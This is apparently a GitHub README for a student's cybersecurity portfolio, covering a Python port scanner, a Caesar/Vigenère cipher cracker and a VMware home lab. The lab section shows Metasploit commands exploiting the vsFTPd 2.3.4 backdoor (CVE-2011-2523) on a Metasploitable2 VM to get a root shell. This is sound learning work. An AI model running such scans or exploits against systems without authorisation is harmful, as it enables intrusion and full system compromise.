# 🔐 CyberSec Portfolio — Phase 1

**Author:** Mahembajr  
**Started:** February 17, 2026  
**Goal:** Self-directed cybersecurity learning path → penetration testing career

This repository documents my Phase 1 cybersecurity projects — built from scratch, tested against real targets, and documented with professional writeups. Every tool here runs on real networks and produces real results.

---

## 📁 Repository Structure

```
cyberscan/
├── port_scanner.py          ← Multithreaded TCP port scanner
├── cipher_cracker.py        ← Caesar & Vigenère encrypt/decrypt/crack
├── README.md                ← You are here
└── writeups/
    └── CVE-2011-2523.md     ← vsFTPd backdoor exploit writeup
```

---

## 🛠️ Project 1 — Python Port Scanner

### What it does
A multithreaded TCP port scanner that performs service fingerprinting and banner grabbing — the same core technique used in professional penetration tests. Rebuilt the core functionality of nmap from scratch using only Python's standard library.

### Key features
- Scans up to 65,535 ports using 100 concurrent threads
- Banner grabbing identifies exact software versions running on open ports
- Service fingerprinting maps ports to known services (SSH, HTTP, SMB, etc.)
- Threaded queue architecture — 1,024 ports scanned in ~11 seconds

### Concepts learned
- TCP/IP and the 3-way handshake (SYN → SYN-ACK → ACK)
- Python sockets — the foundation of all network programming
- Multithreading and thread-safe queues
- Banner grabbing and service version fingerprinting
- How version numbers map to CVE vulnerabilities

### Usage
```bash
python port_scanner.py 127.0.0.1 1 1024
python port_scanner.py scanme.nmap.org 1 1024
python port_scanner.py 192.168.1.1 1 500
```

### Real scan results

**scanme.nmap.org (45.33.32.156)**
```
Port  22  SSH   → SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.13
Port  80  HTTP  → HTTP/1.1 200 OK
Scanned in 11.17 seconds
```

**Metasploitable2 home lab (192.168.11.132)**
```
Port  21  FTP     → 220 (vsFTPd 2.3.4)       ← CVE-2011-2523 backdoor
Port  22  SSH     → SSH-2.0-OpenSSH_4.7p1    ← multiple known CVEs
Port  23  Telnet  → plaintext auth            ← critical risk
Port  25  SMTP    → Postfix (Ubuntu)
Port  53  DNS
Port  80  HTTP    → web application target
Port 111  RPC
Port 139  NetBIOS
Port 445  SMB
Port 512  rexec   → "Where are you?"         ← unauthenticated RCE
Port 513  rlogin
Port 514  rsh
Scanned in 2.21 seconds — 12 open ports
```

**Key finding:** Banner grabbing on port 21 revealed vsFTPd 2.3.4 — a version with a critical backdoor (CVE-2011-2523). This version number directly led to a successful root shell exploit. See writeups/CVE-2011-2523.md.

---

## 🔐 Project 2 — Cipher Cracker

### What it does
A command-line tool that encrypts, decrypts, and automatically cracks Caesar and Vigenère ciphers with no key required for cracking. Implements the Kasiski examination and Index of Coincidence — the same techniques used to break the Vigenère cipher in 1863.

### Key features
- Caesar cipher: encrypt, decrypt, brute force all 25 shifts
- Vigenère cipher: encrypt and decrypt with any keyword
- Vigenère cracker: recovers the key and plaintext from ciphertext alone
- English word scoring and letter frequency analysis for automatic detection
- Interactive menu interface

### Usage
```bash
python cipher_cracker.py
```

### Demo — Vigenère crack with no key
```
Input  (ciphertext, key unknown): Yc bvv fgtgfxcsiu, hjfi rv mogv...
Output (key recovered):           CYBER
Output (plaintext recovered):     We are discovered, flee at once...
```

### Why this matters
Caesar and Vigenère are broken because their key spaces are tiny and statistically detectable. This is exactly why AES-256 uses keys with 2^256 possibilities — making brute force computationally impossible. Understanding why classical ciphers fail teaches you what makes modern ciphers strong.

---

## 🏠 Project 3 — Home Lab Setup

### What I built
A fully isolated penetration testing lab on VMware Workstation Player.

```
Windows Host (192.168.1.15)
└── VMware Workstation Player
    ├── Kali Linux (192.168.11.131)       ← attacker machine
    └── Metasploitable2 (192.168.11.132)  ← vulnerable target
```

### First exploit — CVE-2011-2523

My port scanner identified vsFTPd 2.3.4 on port 21. Metasploit exploited the backdoor:

```bash
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS 192.168.11.132
msf6 > run

[+] UID: uid=0(root) gid=0(root)
[*] Command shell session opened
```

Result: Full root shell. Complete system compromise. Full writeup in writeups/CVE-2011-2523.md.

---

## 🗺️ Roadmap

### Phase 1 — Complete
- [x] Python port scanner with banner grabbing
- [x] Caesar and Vigenère cipher cracker
- [x] Home lab (Kali Linux + Metasploitable2)
- [x] First exploit — CVE-2011-2523 root shell

### Phase 2 — Web Application Security (next)
- [ ] SQL injection on DVWA
- [ ] Cross-site scripting (XSS)
- [ ] File inclusion vulnerabilities
- [ ] Burp Suite web proxy
- [ ] Full web application pentest report

### Phase 3 — Ethical Hacking
- [ ] TryHackMe CTF writeups
- [ ] Vulnerability scanner script
- [ ] Packet analyzer

### Phase 4 — Malware Analysis
- [ ] Static malware analysis lab
- [ ] Ghidra reverse engineering
- [ ] Malware analysis reports

---

## ⚠️ Legal Notice

All techniques were performed on systems I own. The home lab runs on an isolated private network. Only scan and test systems you own or have written authorization to test.

---

*Self-directed cybersecurity learning path. Goal: penetration tester / ethical hacker.*
